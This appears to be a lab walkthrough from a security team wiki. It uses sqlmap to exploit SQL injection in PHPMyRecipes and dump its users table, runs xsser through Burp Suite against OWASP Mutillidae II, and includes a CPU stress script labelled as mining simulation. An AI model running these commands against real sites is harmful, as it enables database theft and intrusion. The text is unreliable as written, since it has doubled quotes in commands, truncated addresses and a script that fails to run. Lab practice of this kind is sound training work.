# Verifying PHPMyRecipes

Step 1: Inspect the web application.

![phpMyRecepies](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/1.jpeg?raw=true)

Step 2: Search on google **“PHPMyRecipes sql injection”** and look for publically
available exploits.

![phpMyRecepies google](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/2.jpeg?raw=true)

The exploit db link contains a python script which can be used to exploit the SQL
Injection vulnerability.
Exploit DB Link: https://www.exploit-db.com/exploits/

![phpMyRecepies search](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/3.jpeg?raw=true)

Step 3: Find the SQL Injection payload using sqlmap.
Analysis of the python script reveals that the “words_exact” parameter sent in
POST request to the web page **“dosearch.php”** webpage is vulnerable.

**Vulnerable web page**: /dosearch.php

**Vulnerable parameter**: words_exact

**Command**: 
```bash
sqlmap -u ""http://demo.ine.local/dosearch.php"" --data
"words_exact=" -p words_exact --method POST
```

Enter the following answer when asked for questions.
- **“Y”** for “Do you want to skip test payloads specific for other DBMses?”
- **“Y”** for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?”
- **“N”** for “Do you want to keep testing the others (if any) ?”

![Sqlmap 1](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/4.jpeg?raw=true)


![Sqlmap 2](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/5.jpeg?raw=true)

## Exfiltrating database names

**Command**:
```bash
sqlmap -u ""http://demo.ine.local/dosearch.php"" --data
"words_exact=" -p words_exact --method POST –dbs
```

![Sqlmap 3](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/6.jpeg?raw=true)

![Sqlmap 4](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/7.jpeg?raw=true)

## Listing the table names

**Command**:
```bash
sqlmap -u ""http://demo.ine.local/dosearch.php"" --data
"words_exact=" -p words_exact --method POST -D recipes --tables
```

![Sqlmap 5](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/8.jpeg?raw=true)

![Sqlmap 6](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/9.jpeg?raw=true)

## Choosing an interesting table 

![Sqlmap 7](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/10.jpeg?raw=true)

![Sqlmap 8](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/11.jpeg?raw=true)

## Listing the table data

**Command**:
```bash
sqlmap -u ""http://demo.ine.local/dosearch.php"" --data
"words_exact=" -p words_exact --method POST -D recipes -T users --dump
```

![Sqlmap 9](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/12.jpeg?raw=true)

![Sqlmap 10](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/13.jpeg?raw=true)

# Verifying Mutillidae II

Step 1: Access the web application using firefox.

**Command**: 
```bash
firefox [http://192.94.37.](http://192.94.37.)
```

![OWASP Multillidae 1](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/14.jpeg?raw=true)

Step 2: Navigate to the XSS DNS lookup webpage.

**Command**:
```bash
firefox [http://192.94.37.3/index.php?page=dns-lookup.php](http://192.94.37.3/index.php?page=dns-lookup.php)
```

![OWASP Multillidae 2](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/15.jpeg?raw=true)

Step 3: Enter any text to `Hostname/IP` textfield and click on `Lookup DNS`

![OWASP Multillidae 3](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/16.jpeg?raw=true)

The entered value is reflected back on the web page.

Step 4: Check the usage of xsser.

**Command**: 
```bash
xsser --help
```

![Xsser](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/17.jpeg?raw=true)

Step 5: Configure firefox to use burp suite proxy.

![FoxyProxy](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/18.jpeg?raw=true)

Step 6: Start burp suite.

![Burp Suite 1](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/19.jpeg?raw=true)

Step 7: Enter any text to “ Hostname/IP ” textfield and click on "Lookup DNS". The
request will be intercepted by burp suite.

![Burp Suite 2](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/20.jpeg?raw=true)

Step 8: Pass the URL to XSSER. Replace `HelloWorld` with `XSS` , this is done so that XSSer will substitute payload in place of `XSS` string.

**Command**:
```bash
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

![XSS](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/21.jpeg?raw=true)

The output confirms that the target is vulnerable.

# CPU Mining

Step 1: We need to create a script c**pu_mining_sim.py**

```python
```python
import math
import multiprocessing
import argparse
from itertools import count

def cpu_intensive_task():
    for n in count(start=1):
        math.factorial(100000)
        math.exp(n) ** math.pi
        sum(math.sqrt(i) for i in range(1000000))

def main(num_processes):
    print(f"Starting CPU stress test with {num_processes} processes...")
    print("Warning: This will significantly increase CPU usage!")
    print("Press Ctrl+C to stop\n")

    pool = multiprocessing.Pool(processes=num_processes)

    try:
        pool.map_async(lambda x: cpu_intensive_task(), range(num_processes))
        while True:
            pass  # Keep main thread alive
    except KeyboardInterrupt:
        print("\nStopping CPU stress test...")
        pool.terminate()
        pool.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CPU Mining Simulator')
    parser.add_argument('-p', '--processes', type=int,
                        default=multiprocessing.cpu_count(),
                        help='Number of parallel processes (default: all cores)')
    args = parser.parse_args()

    main(args.processes)
```

Step 2: Perform the script

**Command**:
```bash
python cpu_mining_sim.py
```

![python](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/22.jpeg?raw=true)

Step 3: Check the CPU

**Command**: 
```bash
htop
```

![htop](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Jose%20Zamora/images/23.jpeg?raw=true)